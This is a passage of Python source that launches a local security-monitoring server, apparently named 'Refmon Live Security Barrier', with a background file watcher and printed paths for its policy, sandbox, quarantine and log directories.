    *, host: str = "127.0.0.1", port: int = 8765, workdir: str | Path | None = None
) -> int:
    barrier = LiveBarrier(workdir=workdir)
    barrier.start_background_watcher()
    server = make_http_server(barrier, host=host, port=port)
    actual_port = server.server_address[1]
    ui_url = f"http://localhost:{actual_port}"
    print(f"Refmon Live Security Barrier active on {ui_url}", flush=True)
    print(f"  Signed policy : {barrier.policy_path} (mode={barrier.policy.mode.value})", flush=True)
    print(f"  Sandbox watch : {barrier.sandbox_dir}", flush=True)
    print(f"  Quarantine    : {barrier.quarantine_dir}", flush=True)
    print(f"  Live logs     : {barrier.logs_dir}", flush=True)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        server.server_close()
        barrier.stop_background_watcher()
    return 0
